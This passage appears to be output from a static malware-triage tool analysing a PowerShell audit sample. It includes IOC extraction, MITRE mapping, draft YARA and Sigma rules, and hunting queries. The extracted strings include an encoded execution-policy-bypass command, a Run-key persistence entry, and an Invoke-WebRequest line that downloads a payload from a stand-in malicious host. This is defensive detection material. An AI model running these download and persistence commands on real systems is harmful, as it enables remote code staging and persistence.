  "draftYara": "rule ThreatRecon_Suspicious_Script {\n  meta:\n    description = \"Draft rule generated from local static triage\"\n    author = \"ThreatRecon\"\n    source = \"Local browser analysis\"\n    confidence = \"medium\"\n  strings:\n    $s1 = \"Encoded PowerShell command — obfuscated payload delivery\" nocase // behavior\n    $s2 = \"IEX / Invoke-Expression — dynamic code execution\" nocase // behavior\n    $s3 = \"HKCU\\\\Software\\\\TestKey\\\\Run\" nocase // artifact\n    $s4 = \"example-malicious-test.com\" nocase // network\n    $s5 = \"Domain: example-malicious-test.com\" nocase // URLs and domains\n    $s6 = \"Documentation IPs: 192.0.2.1 and 198.51.100.23\" nocase // IPs\n    $s7 = \"Command: powershell -enc SQBFAFgA\" nocase // PowerShell strings\n    $s8 = \"Suspicious string marker: Invoke-Expression is not executed in this text sample.\" nocase // PowerShell strings\n    $s9 = \"SHA256-lookalike: abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\" nocase // Crypto strings\n  condition:\n    3 of them\n}",
  "draftSigma": "title: ThreatRecon Encoded PowerShell\nid: 00000000-0000-4000-8000-000000000000\nstatus: experimental\ndescription: Draft Sigma rule generated from local static triage. Analyst review required before production use.\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains:\n      - \"powershell\"\n      - \"-enc\"\n      - \"HKCU\\\\Software\\\\TestKey\\\\Run\"\n      - \"example-malicious-test.com\"\n      - \"Command: powershell -enc SQBFAFgA\"\n  condition: selection\nfalsepositives:\n  - Administrative scripts\n  - Security testing\nlevel: high\ntags:\n  - attack.t1059_001\n  - attack.t1027_010\n  - attack.t1071",
  "huntingQueries": [
    {
      "value": "198.51.100.23",
      "splunk": "index=* \"198.51.100.23\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"198.51.100.23\"",
      "elastic": "process.command_line : \"*198.51.100.23*\""
    },
    {
      "value": "example-malicious-test.com",
      "splunk": "index=* \"example-malicious-test.com\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"example-malicious-test.com\"",
      "elastic": "process.command_line : \"*example-malicious-test.com*\""
    },
    {
      "value": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "splunk": "index=* \"abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\"",
      "elastic": "process.command_line : \"*abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789*\""
    },
    {
      "value": "Command: powershell -enc SQBFAFgA",
      "splunk": "index=* \"Command: powershell -enc SQBFAFgA\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"Command: powershell -enc SQBFAFgA\"",
      "elastic": "process.command_line : \"*Command: powershell -enc SQBFAFgA*\""
    }
  ],
  "detectionEngineering": {
    "draftSigma": "title: ThreatRecon Encoded PowerShell\nid: 00000000-0000-4000-8000-000000000000\nstatus: experimental\ndescription: Draft Sigma rule generated from local static triage. Analyst review required before production use.\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains:\n      - \"powershell\"\n      - \"-enc\"\n      - \"HKCU\\\\Software\\\\TestKey\\\\Run\"\n      - \"example-malicious-test.com\"\n      - \"Command: powershell -enc SQBFAFgA\"\n  condition: selection\nfalsepositives:\n  - Administrative scripts\n  - Security testing\nlevel: high\ntags:\n  - attack.t1059_001\n  - attack.t1027_010\n  - attack.t1071",
    "draftYara": "rule ThreatRecon_Suspicious_Script {\n  meta:\n    description = \"Draft rule generated from local static triage\"\n    author = \"ThreatRecon\"\n    source = \"Local browser analysis\"\n    confidence = \"medium\"\n  strings:\n    $s1 = \"Encoded PowerShell command — obfuscated payload delivery\" nocase // behavior\n    $s2 = \"IEX / Invoke-Expression — dynamic code execution\" nocase // behavior\n    $s3 = \"HKCU\\\\Software\\\\TestKey\\\\Run\" nocase // artifact\n    $s4 = \"example-malicious-test.com\" nocase // network\n    $s5 = \"Domain: example-malicious-test.com\" nocase // URLs and domains\n    $s6 = \"Documentation IPs: 192.0.2.1 and 198.51.100.23\" nocase // IPs\n    $s7 = \"Command: powershell -enc SQBFAFgA\" nocase // PowerShell strings\n    $s8 = \"Suspicious string marker: Invoke-Expression is not executed in this text sample.\" nocase // PowerShell strings\n    $s9 = \"SHA256-lookalike: abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\" nocase // Crypto strings\n  condition:\n    3 of them\n}",
    "splunk": [
      "index=* \"198.51.100.23\"",
      "index=* \"example-malicious-test.com\"",
      "index=* \"abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\"",
      "index=* \"Command: powershell -enc SQBFAFgA\""
    ],
    "defender": [
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"198.51.100.23\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"example-malicious-test.com\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"Command: powershell -enc SQBFAFgA\""
    ],
    "elastic": [
      "process.command_line : \"*198.51.100.23*\"",
      "process.command_line : \"*example-malicious-test.com*\"",
      "process.command_line : \"*abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789*\"",
      "process.command_line : \"*Command: powershell -enc SQBFAFgA*\""
    ],
    "firewallBlocklist": [
      "example-malicious-test.com",
      "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
    ],
    "dnsBlocklist": [
      "example-malicious-test.com"
    ],
    "edrHashHunts": [
      "Search endpoint file/process telemetry for hash abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
    ]
  },
  "threatIntelPivots": [
    {
      "ioc": "example-malicious-test.com",
      "normalizedValue": "example-malicious-test.com",
      "type": "domain",
      "actionable": true,
      "provider": "VirusTotal",
      "url": "https://www.virustotal.com/gui/search/example-malicious-test.com",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Domain indicator requiring validation."
    },
    {
      "ioc": "example-malicious-test.com",
      "normalizedValue": "example-malicious-test.com",
      "type": "domain",
      "actionable": true,
      "provider": "URLhaus",
      "url": "https://urlhaus.abuse.ch/browse.php?search=example-malicious-test.com",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Domain indicator requiring validation."
    },
    {
      "ioc": "example-malicious-test.com",
      "normalizedValue": "example-malicious-test.com",
      "type": "domain",
      "actionable": true,
      "provider": "ThreatFox",
      "url": "https://threatfox.abuse.ch/browse.php?search=example-malicious-test.com",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Domain indicator requiring validation."
    },
    {
      "ioc": "example-malicious-test.com",
      "normalizedValue": "example-malicious-test.com",
      "type": "domain",
      "actionable": true,
      "provider": "AlienVault OTX",
      "url": "https://otx.alienvault.com/indicator/domain/example-malicious-test.com",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Domain indicator requiring validation."
    },
    {
      "ioc": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "normalizedValue": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "type": "sha256",
      "actionable": true,
      "provider": "VirusTotal",
      "url": "https://www.virustotal.com/gui/search/abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    },
    {
      "ioc": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "normalizedValue": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "type": "sha256",
      "actionable": true,
      "provider": "MalwareBazaar",
      "url": "https://bazaar.abuse.ch/browse.php?search=sha256%3Aabcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    },
    {
      "ioc": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "normalizedValue": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "type": "sha256",
      "actionable": true,
      "provider": "ThreatFox",
      "url": "https://threatfox.abuse.ch/browse.php?search=abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    },
    {
      "ioc": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "normalizedValue": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "type": "sha256",
      "actionable": true,
      "provider": "AlienVault OTX",
      "url": "https://otx.alienvault.com/indicator/file/abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    }
  ],
  "skippedThreatIntelPivots": [
    {
      "ioc": "198.51.100.23",
      "normalizedValue": "198.51.100.23",
      "type": "ip",
      "actionable": false,
      "reason": "Skipped: documentation IP range",
      "category": "documentation-ip"
    },
    {
      "ioc": "192.0.2.1",
      "normalizedValue": "192.0.2.1",
      "type": "ip",
      "actionable": false,
      "reason": "Skipped: documentation IP range",
      "category": "documentation-ip"
    },
    {
      "ioc": "HKCU\\Software\\TestKey\\Run",
      "normalizedValue": "HKCU\\Software\\TestKey\\Run",
      "type": "registry_key",
      "actionable": false,
      "reason": "Skipped: not suitable for reputation pivot",
      "category": "not-suitable"
    }
  ],
  "deobfuscated": [],
  "blocklist": [
    "example-malicious-test.com",
    "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
  ]
}
```
### IOC CSV
```csv
type,value,source,confidence,notes
ip,198.51.100.23,ThreatRecon local extraction,High,actionable=no | Reserved documentation IP range; training/demo indicator only. | Keep for report context; do not block.
local_ip,192.0.2.1,ThreatRecon local extraction,High,"actionable=no | Local/private/special IP is local context only. | Use for host triage, not network blocklists."
domain,example-malicious-test.com,ThreatRecon local extraction,Medium,actionable=yes | Domain indicator requiring validation. | Validate reputation and consider DNS/proxy/URL block only if confirmed malicious.
registry_key,HKCU\Software\TestKey\Run,ThreatRecon local extraction,High,actionable=no | Registry path is a host hunt indicator | Hunt endpoint telemetry and autoruns.
hash,abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789,ThreatRecon local extraction,High,actionable=yes | Hash indicator | Use for EDR hash hunts; block only after validation.
```
### Blocklist
```text
# ThreatRecon blocklist export
# Actionable public IPs, domains, URLs, and hashes only
# Local/private, reserved documentation, demo/test, and known public resolver indicators are excluded.
example-malicious-test.com
abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789
```
### YARA
```yara
rule ThreatRecon_Suspicious_Script {
  meta:
    description = "Draft rule generated from local static triage"
    author = "ThreatRecon"
    source = "Local browser analysis"
    confidence = "medium"
  strings:
    $s1 = "Encoded PowerShell command — obfuscated payload delivery" nocase // behavior
    $s2 = "IEX / Invoke-Expression — dynamic code execution" nocase // behavior
    $s3 = "HKCU\\Software\\TestKey\\Run" nocase // artifact
    $s4 = "example-malicious-test.com" nocase // network
    $s5 = "Domain: example-malicious-test.com" nocase // URLs and domains
    $s6 = "Documentation IPs: 192.0.2.1 and 198.51.100.23" nocase // IPs
    $s7 = "Command: powershell -enc SQBFAFgA" nocase // PowerShell strings
    $s8 = "Suspicious string marker: Invoke-Expression is not executed in this text sample." nocase // PowerShell strings
    $s9 = "SHA256-lookalike: abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789" nocase // Crypto strings
  condition:
    3 of them
}
```
### Sigma
```yaml
title: ThreatRecon Encoded PowerShell
id: 00000000-0000-4000-8000-000000000000
status: experimental
description: Draft Sigma rule generated from local static triage. Analyst review required before production use.
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - "powershell"
      - "-enc"
      - "HKCU\\Software\\TestKey\\Run"
      - "example-malicious-test.com"
      - "Command: powershell -enc SQBFAFgA"
  condition: selection
falsepositives:
  - Administrative scripts
  - Security testing
level: high
tags:
  - attack.t1059_001
  - attack.t1027_010
  - attack.t1071
```


# sample2.ps1

## 1. Static Metadata
```json
{
  "byteLength": 622,
  "lines": 6,
  "entropy": 5.295691098654294,
  "peTriage": {
    "detected": false,
    "hasMZ": false,
    "hasPE": false,
    "fileType": "No PE structure detected",
    "architecture": "Not available",
    "timestamp": null,
    "subsystem": null,
    "dllCharacteristics": [],
    "imageBase": null,
    "entryPointRva": null,
    "sections": [],
    "imports": [],
    "importDlls": [],
    "exports": [],
    "suspiciousApiStrings": [],
    "packedIndicators": [],
    "warnings": [],
    "realImportTableParsed": false,
    "packerHints": []
  }
}
```

## 2. Strings Extraction
### Printable Strings
```text
# ThreatRecon audit sample 2 - benign PowerShell text only
$Encoded = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA="
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "AuditSample2" -Value "powershell.exe -File C:\Users\Public\audit-sample2.ps1"
Invoke-WebRequest -Uri "http://example-malicious-test.com/payload.ps1" -OutFile "$env:TEMP\payload.ps1"
```
### Classified Strings
```json
[
  {
    "type": "evasion",
    "val": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQA"
  },
  {
    "type": "network",
    "val": "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP"
  }
]
```
### Strings Intelligence
```json
[
  {
    "name": "Network indicators",
    "confidence": "High",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\\payload.ps1\""
    ]
  },
  {
    "name": "URLs and domains",
    "confidence": "High",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\\payload.ps1\""
    ]
  },
  {
    "name": "Registry strings",
    "confidence": "High",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\""
    ]
  },
  {
    "name": "File paths",
    "confidence": "Medium",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\""
    ]
  },
  {
    "name": "PowerShell strings",
    "confidence": "High",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "# ThreatRecon audit sample 2 - benign PowerShell text only",
      "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=",
      "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\"",
      "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\\payload.ps1\""
    ]
  },
  {
    "name": "Persistence strings",
    "confidence": "High",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\""
    ]
  },
  {
    "name": "Suspicious commands",
    "confidence": "High",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "# ThreatRecon audit sample 2 - benign PowerShell text only",
      "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=",
      "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\""
    ]
  }
]
```

## 3. Suspicious API Detection
```json
{
  "suspiciousApiStrings": [],
  "apiRisk": []
}
```

## 4. IOC Extraction
```json
{
  "iocs": {
    "ips": [],
    "localIndicators": [],
    "urls": [
      "http://example-malicious-test.com/payload.ps1"
    ],
    "domains": [],
    "onion": [],
    "md5": [],
    "sha1": [],
    "sha256": [],
    "emails": [],
    "registry": [
      "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    ],
    "paths": [
      "C:\\Users\\Public\\audit-sample2.ps1"
    ],
    "btc": [],
    "cve": [],
    "mutex": []
  },
  "actionability": [
    {
      "type": "url",
      "value": "http://example-malicious-test.com/payload.ps1",
      "confidence": "Medium",
      "actionable": true,
      "reason": "URL indicator requiring validation.",
      "recommendedAction": "Validate reputation and consider DNS/proxy/URL block only if confirmed malicious."
    },
    {
      "type": "registry_key",
      "value": "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "confidence": "High",
      "actionable": false,
      "reason": "Registry path is a host hunt indicator",
      "recommendedAction": "Hunt endpoint telemetry and autoruns."
    },
    {
      "type": "file_path",
      "value": "C:\\Users\\Public\\audit-sample2.ps1",
      "confidence": "Medium",
      "actionable": false,
      "reason": "File path is a host hunt indicator",
      "recommendedAction": "Hunt endpoint file/process telemetry."
    }
  ],
  "threatIntelPivots": [
    {
      "ioc": "http://example-malicious-test.com/payload.ps1",
      "normalizedValue": "http://example-malicious-test.com/payload.ps1",
      "type": "url",
      "actionable": true,
      "provider": "VirusTotal",
      "url": "https://www.virustotal.com/gui/search/http%3A%2F%2Fexample-malicious-test.com%2Fpayload.ps1",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    },
    {
      "ioc": "http://example-malicious-test.com/payload.ps1",
      "normalizedValue": "http://example-malicious-test.com/payload.ps1",
      "type": "url",
      "actionable": true,
      "provider": "URLhaus",
      "url": "https://urlhaus.abuse.ch/browse.php?search=http%3A%2F%2Fexample-malicious-test.com%2Fpayload.ps1",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    },
    {
      "ioc": "http://example-malicious-test.com/payload.ps1",
      "normalizedValue": "http://example-malicious-test.com/payload.ps1",
      "type": "url",
      "actionable": true,
      "provider": "AlienVault OTX",
      "url": "https://otx.alienvault.com/indicator/url/http%3A%2F%2Fexample-malicious-test.com%2Fpayload.ps1",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    },
    {
      "ioc": "http://example-malicious-test.com/payload.ps1",
      "normalizedValue": "http://example-malicious-test.com/payload.ps1",
      "type": "url",
      "actionable": true,
      "provider": "ThreatFox",
      "url": "https://threatfox.abuse.ch/browse.php?search=http%3A%2F%2Fexample-malicious-test.com%2Fpayload.ps1",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    }
  ],
  "skippedThreatIntelPivots": [
    {
      "ioc": "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "normalizedValue": "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "type": "registry_key",
      "actionable": false,
      "reason": "Skipped: not suitable for reputation pivot",
      "category": "not-suitable"
    },
    {
      "ioc": "C:\\Users\\Public\\audit-sample2.ps1",
      "normalizedValue": "C:\\Users\\Public\\audit-sample2.ps1",
      "type": "file_path",
      "actionable": false,
      "reason": "Skipped: not suitable for reputation pivot",
      "category": "not-suitable"
    }
  ]
}
```

## 5. MITRE ATT&CK Mapping
```json
{
  "mitre": [
    "T1027.010",
    "T1059.001",
    "T1105",
    "T1547.001",
    "T1027",
    "T1071"
  ],
  "attackTable": [
    {
      "tactic": "Defense Evasion",
      "techniqueId": "T1027.010",
      "techniqueName": "Command Obfuscation",
      "observedEvidence": "Encoded PowerShell command — obfuscated payload delivery",
      "confidence": "High",
      "detectionIdea": "Hunt for evidence containing \"Encoded PowerShell command — obfuscated payload delivery\" in process, registry, and script telemetry."
    },
    {
      "tactic": "Execution",
      "techniqueId": "T1059.001",
      "techniqueName": "PowerShell",
      "observedEvidence": "PowerShell execution policy bypass",
      "confidence": "High",
      "detectionIdea": "Monitor PowerShell command line arguments, encoded commands, hidden windows, and suspicious parents."
    },
    {
      "tactic": "Command and Control",
      "techniqueId": "T1105",
      "techniqueName": "Ingress Tool Transfer",
      "observedEvidence": "Network download cradle — remote payload staging",
      "confidence": "High",
      "detectionIdea": "Hunt for command lines or processes contacting extracted network IOCs."
    },
    {
      "tactic": "Persistence",
      "techniqueId": "T1547.001",
      "techniqueName": "Registry Run Keys",
      "observedEvidence": "Registry Run key modification — persistence",
      "confidence": "High",
      "detectionIdea": "Monitor registry Run and Winlogon key creation or modification."
    },
    {
      "tactic": "Defense Evasion",
      "techniqueId": "T1027",
      "techniqueName": "Obfuscated Files or Info",
      "observedEvidence": "Large Base64 encoded blob — likely embedded payload",
      "confidence": "Medium",
      "detectionIdea": "Hunt for evidence containing \"Large Base64 encoded blob — likely embedded payload\" in process, registry, and script telemetry."
    },
    {
      "tactic": "Command and Control",
      "techniqueId": "T1071",
      "techniqueName": "Application Layer Protocol",
      "observedEvidence": "Technique inferred from IOC or static context",
      "confidence": "Medium",
      "detectionIdea": "Hunt for command lines or processes contacting extracted network IOCs."
    }
  ],
  "attackTimeline": [
    {
      "stage": "Execution",
      "evidence": [
        "Encoded PowerShell command — obfuscated payload delivery",
        "PowerShell execution policy bypass"
      ],
      "confidence": "High",
      "technique": "T1027.010",
      "validation": "Review process creation and script block logs."
    },
    {
      "stage": "Defense Evasion",
      "evidence": [
        "Encoded PowerShell command — obfuscated payload delivery",
        "PowerShell execution policy bypass",
        "Large Base64 encoded blob — likely embedded payload"
      ],
      "confidence": "High",
      "technique": "T1027.010",
      "validation": "Check security control tampering and obfuscation telemetry."
    },
    {
      "stage": "Payload Download",
      "evidence": [
        "Network download cradle — remote payload staging"
      ],
      "confidence": "Medium",
      "technique": "T1105",
      "validation": "Validate network connections and downloaded file hashes."
    },
    {
      "stage": "Persistence",
      "evidence": [
        "Static text matched persistence keywords."
      ],
      "confidence": "Medium",
      "technique": null,
      "validation": "Inspect autoruns, scheduled tasks, services, and shell profiles."
    }
  ]
}
```

## 6. YARA Draft Rule
```yara
rule ThreatRecon_Suspicious_Script {
  meta:
    description = "Draft rule generated from local static triage"
    author = "ThreatRecon"
    source = "Local browser analysis"
    confidence = "medium"
  strings:
    $s1 = "Encoded PowerShell command — obfuscated payload delivery" nocase // behavior
    $s2 = "PowerShell execution policy bypass" nocase // behavior
    $s3 = "Network download cradle — remote payload staging" nocase // behavior
    $s4 = "Registry Run key modification — persistence" nocase // behavior
    $s5 = "Large Base64 encoded blob — likely embedded payload" nocase // behavior
    $s6 = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" nocase // artifact
    $s7 = "C:\\Users\\Public\\audit-sample2.ps1" nocase // artifact
    $s8 = "http://example-malicious-test.com/payload.ps1" nocase // network
    $s9 = "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\\payload.ps1\"" nocase // Network indicators
    $s10 = "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powe" nocase // Registry strings
    $s11 = "# ThreatRecon audit sample 2 - benign PowerShell text only" nocase // PowerShell strings
    $s12 = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG" nocase // PowerShell strings
  condition:
    3 of them
}
```

## 7. Sigma Draft Rule
```yaml
title: ThreatRecon Encoded PowerShell
id: 00000000-0000-4000-8000-000000000000
status: experimental
description: Draft Sigma rule generated from local static triage. Analyst review required before production use.
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - "powershell"
      - "-enc"
      - "CurrentVersion\\\\Run"
      - "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
      - "http://example-malicious-test.com/payload.ps1"
      - "C:\\Users\\Public\\audit-sample2.ps1"
      - "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA="
      - "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\""
  condition: selection
falsepositives:
  - Administrative scripts
  - Security testing
level: high
tags:
  - attack.t1059_001
  - attack.t1027_010
  - attack.t1547_001
  - attack.t1105
  - attack.t1027
  - attack.t1071
```

## 8. Threat Hunting Output
```json
{
  "huntingQueries": [
    {
      "value": "http://example-malicious-test.com/payload.ps1",
      "splunk": "index=* \"http://example-malicious-test.com/payload.ps1\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"http://example-malicious-test.com/payload.ps1\"",
      "elastic": "process.command_line : \"*http://example-malicious-test.com/payload.ps1*\""
    },
    {
      "value": "# ThreatRecon audit sample 2 - benign PowerShell text only",
      "splunk": "index=* \"# ThreatRecon audit sample 2 - benign PowerShell text only\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"# ThreatRecon audit sample 2 - benign PowerShell text only\"",
      "elastic": "process.command_line : \"*# ThreatRecon audit sample 2 - benign PowerShell text only*\""
    },
    {
      "value": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG",
      "splunk": "index=* \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG\"",
      "elastic": "process.command_line : \"*powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG*\""
    },
    {
      "value": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe",
      "splunk": "index=* \"New-ItemProperty -Path \\\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"New-ItemProperty -Path \\\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe\"",
      "elastic": "process.command_line : \"*New-ItemProperty -Path \\\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe*\""
    },
    {
      "value": "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\\payload.ps1\"",
      "splunk": "index=* \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\payload.ps1\\\"\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\payload.ps1\\\"\"",
      "elastic": "process.command_line : \"*Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\payload.ps1\\\"*\""
    }
  ],
  "detectionEngineering": {
